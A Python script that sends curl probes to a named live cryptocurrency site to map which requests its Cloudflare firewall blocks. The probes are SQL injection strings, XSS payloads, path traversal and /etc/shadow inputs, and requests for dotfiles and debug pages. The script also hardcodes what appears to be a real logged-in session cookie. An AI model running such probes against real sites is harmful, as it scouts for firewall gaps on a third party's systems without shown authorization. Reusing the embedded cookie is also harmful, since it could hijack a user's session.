import subprocess, time

BASE = "https://bitcoinvn.io"
COOKIE = "REMEMBERME=%3Ab21uaWNvbm5lY3QwMEBnbWFpbC5jb20~%3A1794982284%3Alogin-method-v1%3AWyJnb29nbGUiLGZhbHNlLCJXaGt0cWxCVUwtdUlLRkI0M1AyQkcxNTJ2UFdXWktfdjhocUVUNzlvbUh3fjU2d0hobWFPRF9Ed0sySzlCUFJmOWpiOWd0dGpzUkJHQWNsMTNBQmZPbWN%2BIl0%3D%3Aca962b8ce904172eb281811fdf1f84efb603a9dc7f3f6382aa79fdf87866f46f; SID=002ed1eb0006b3d9e084200584a9250a"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def probe(path):
    cmd = ["curl", "-s", "-D", "/tmp/h.txt", "-o", "/tmp/b.txt", "--max-time", "10",
           "-H", f"Cookie: {COOKIE}", "-H", f"User-Agent: {UA}", BASE + path]
    subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    with open("/tmp/h.txt") as f: hd = f.read()
    with open("/tmp/b.txt", errors="replace") as f: body = f.read()
    status = hd.split("\r\n")[0].split(" ")[1] if hd else "?"
    is_origin = ("content-security-policy" in hd.lower()) or ("cf-cache-status" in hd.lower())
    return status, len(body), ("origin" if is_origin else "CF-WAF")

tests = [
  # SQLi keyword granularity
  ("/?q=union select","SQLi 'union select' in query"),
  ("/?q=select union","reversed order"),
  ("/?q=union","bare 'union' alone"),
  ("/?q=select","bare 'select' alone"),
  ("/?q=drop table","'drop table'"),
  ("/?q=' or 1=1 --","classic sqli quote/or"),
  ("/?q=sleep(5)","sleep() func"),
  ("/?q=BENCHMARK(1,MD5('a'))","benchmark"),
  ("/?q=concat(0x41)","hex concat"),
  # XSS granularity
  ("/?v=<script>alert(1)</script>","<script> tag"),
  ("/?v=onerror=alert(1)","onerror attr only"),
  ("/?v=javascript:alert(1)","js: URI only"),
  ("/?v=<svg>","<svg> tag alone"),
  ("/?v=alert(document.cookie)","alert() alone"),
  # Path traversal / LFI
  ("/?f=../../etc/passwd","traversal+passwd"),
  ("/?f=..%2f..%2fetc","url-encoded traversal"),
  ("/?f=/etc/shadow","absolute /etc/shadow"),
  ("/?f=php://input","php input wrapper"),
  ("/?f=data://text/plain","data uri"),
  # dotfiles individually
  ("/.env.bak",".env.bak"),
  ("/.gitignore",".gitignore"),
  ("/.hidden-test","random dotfile"),
  # php extensions
  ("/info.php","generic .php"),
  ("/test.php","test.php"),
  ("/admin.php","admin.php"),
  # framework debug paths
  ("/_profiler/phpinfo","profiler phpinfo"),
  ("/debug/default/view","symfony old debug"),
  ("/_notes/","server-tomcat"),
  # benign control
  ("/?q=hello world","benign words"),
  ("/?order=asc","benign 'or' substring"),
  ("/selection","benign contains 'elect'"),
]

print(f"{'TEST':<42} {'CODE':<5} {'LEN':<8} {'SOURCE'}")
for p,label in tests:
    try:
        s,l,src = probe(p)
        print(f"{label:<42} {s:<5} {l:<8} {src}")
        time.sleep(0.4)
    except Exception as e:
        print(f"{label:<42} ERR {e}")
